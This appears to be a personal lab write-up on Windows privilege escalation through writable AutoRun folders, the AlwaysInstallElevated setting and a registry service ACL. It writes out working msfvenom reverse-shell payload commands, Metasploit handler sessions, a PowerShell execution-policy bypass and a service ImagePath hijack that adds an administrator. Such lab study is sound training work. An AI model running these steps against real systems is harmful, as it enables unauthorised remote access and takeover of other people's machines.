### AutoRun

Using a sysinternals tool, autoruns.exe, we can take a look at a lot of different items.

In this one, when we run it, we're looking at the very top, in the Run folder, we see something called "My Program".

![[Pasted image 20241021232955.png]]

It's located in the listed folder.

We can then use another sysinternals tool, accesschk64.exe, to see what accesses we have.  We utilize cmd for this one with the following command.

**C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"**
	-wvu   this is for show only items that have write access (-w), verbose output, and suppress errors (-u).
We get the following output.

![[2024-10-21 23_45_37-Window.png]]

We can see that everyone has FILE_ALL_ACCESS.

Another way to accomplish this is to use a tool called PowerUp.  Its a powershell script.  You can run it using the following

![[2024-10-21 23_59_19-Window.png]]

You have to run the `powershell -ep bypass` to get it to run correctly.  This will start to spit out a bunch of info.  But here we also find similiar to what we found before.

![[Pasted image 20241022000642.png]]

Find that out and start up `msfconsole` and use the following.

```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.6.x.x
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.6.x.x:4444 
```

This will get our handler going.  Then we need to open msfvenom and create a program to start that connection in a new tab.

```
(kali㉿kali)-$ msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 -f exe -o program.exe                           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

I changed out the text to say tun0 instead of my IP.  Keep using your IP when you can.

Now we need to move the program.exe to the target machine.  We can do this with a simple http server with python

`python -m http.server 80`

Then use the browser on the target to connect to our http server and download the file into the correct folder and run it.  And when we check the listener that we set in Metasploit, we get the following.

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.6.x.x:4444 
[*] Sending stage (176198 bytes) to 10.10.85.199
[*] Meterpreter session 1 opened (10.6.x.x:4444 -> 10.10.85.199:49302) at 2024-10-22 00:26:28 -0400

meterpreter > pwd
C:\Users\user\Desktop
```

We're still just the user though.  Exit out of that meterpreter, re-ran the handler.  Went to the device, selected the disconnect option and then reconnected via the rdesktop and this time logged in with the admin account.

Once logged in, I was prompted to run the auto run file that we had put in the file.  Once we ran that, we got a new session but this time, we get the following

```
[*] Started reverse TCP handler on 10.6.x.x:4444 
[*] Sending stage (176198 bytes) to 10.10.85.199
[*] Meterpreter session 2 opened (10.6.x.x:4444 -> 10.10.85.199:49310) at 2024-10-22 00:31:31 -0400

meterpreter > pwd
C:\Windows\system32
```

Tried `getsystem` after that but didn't work.

### AlwaysInstallElevated

This is a registry setting that can be taken advantage of.  If it's set, it allows programs to automatically be installed as Administrator.

Check this by checking the following

`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`

![[2024-10-22 00_53_24-Window.png]]

As we see, the 0x1 means that it's set to 1 or on.

Check the following and make see if that one is the same.

`reg query HKCU\Software\Policies\Microsoft\Windows\Installer`

![[2024-10-22 00_55_31-Window.png]]

And we see, in fact, that it is.  We checked HKLM and HKCU.

So, we can use pretty close to the same trick as before.

```
(kali㉿kali)-$ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.6.x.x -f msi -o setup.msi                             
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

Using this msfvenom and the same setup we did before with the handler, we create an msi file.  This is significant because these are the types of files that are set to always run as admin.

Create that and copy it over using the same http server we already set up.  You can set up a new one if you are doing this with no prior engagements.

On the victim machine, you run the file with the following command (I didn't, I just opened a cmd window and ran it without options but I did get a couple errors back but it still worked).

Put the file in the C:\Temp folder and run the following:

`msiexec /quiet /qn /i C:\Temp\setup.msi`

My guess is the /quiet and other options keep the errors that I saw from popping up.  Still, the result was the same.

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.6.x.x:4444 
[*] Sending stage (176198 bytes) to 10.10.85.199
[*] Meterpreter session 3 opened (10.6.x.x:4444 -> 10.10.85.199:49355) at 2024-10-22 00:59:38 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

There is also, after we did the `Invoke-AllChecks` command from the PowerUp tools, we got to see the following.

![[Pasted image 20241022011017.png]]

With this, we can run the following.

![[Pasted image 20241022011132.png]]

Then we go to that folder and see the new UserAdd program.

![[Pasted image 20241022011237.png]]

We can then run that program and because it's always running msi files as Admin, we can create ourselves a new administrator.

![[Pasted image 20241022011334.png]]

Click on create and then we can check the admins again.

![[Pasted image 20241022011512.png]]

Now we have a new administrator user.

### Regsvc ACL (Service Escalation)

This may require installing the following command `sudo apt install gcc-mingw-w64`

In the same cmd with `powershell -ep bypass` run, run the following command

`Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`

![[2024-10-22 01_28_16-Window.png]]

We're looking at the access control list for the registry entry in regsvc.  NT Auth\Interactive has fullcontrol of this file.  This means we can execute this vulnerability.  We can create an executable and then tie it to a service and the start that service as an admin.  Here, we create a user but this can be used to get a shell and other things as well.

We need to copy a file from the victim machine over to our machine.  We can do this by starting an FTP server on our device with python

`python3 -m pyftpdlib -p 21 --write` 

This did require installing this tool using `sudo apt install python3-pyftpdlib`

This should give write access and set the server up on port 21.  And then back on the Victim machine, we transfer over the file using ftp.

![[2024-10-22 01_44_07-Window.png]]

And then use the `put` command to put the file that you want to move over and work with.

Once we move the file over, we use gedit to edit the file.  Then we can compile it since it's a C program.

`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`

Then we use the `get` command in the ftp window to get the command and then move it to the Temp folder.  And then run the following command on the victim machine.

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`

This is adding to the registery.  `/v ImagePath` is the registry key that contains the path of the Image file.  This is what is tying the `x.exe` to the registry service, `regsvc`.  It is saying that when the `regsvc` starts, that it should run the file `c:\temp\x.exe` as part of it's process.  The `/t REG_EXPAND_SZ` part is just saying that this type (/t) is a regular string value, `/d c:\temp\x.exe`.  `/f` is just saying to not prompt for this action, do it quietly.

You should get back that the operation completed successfully.  Then run a simple restart of the service.

`sc start regsvc`

Now when you check the `net localgroup administrators` you should see the user `User` listed.
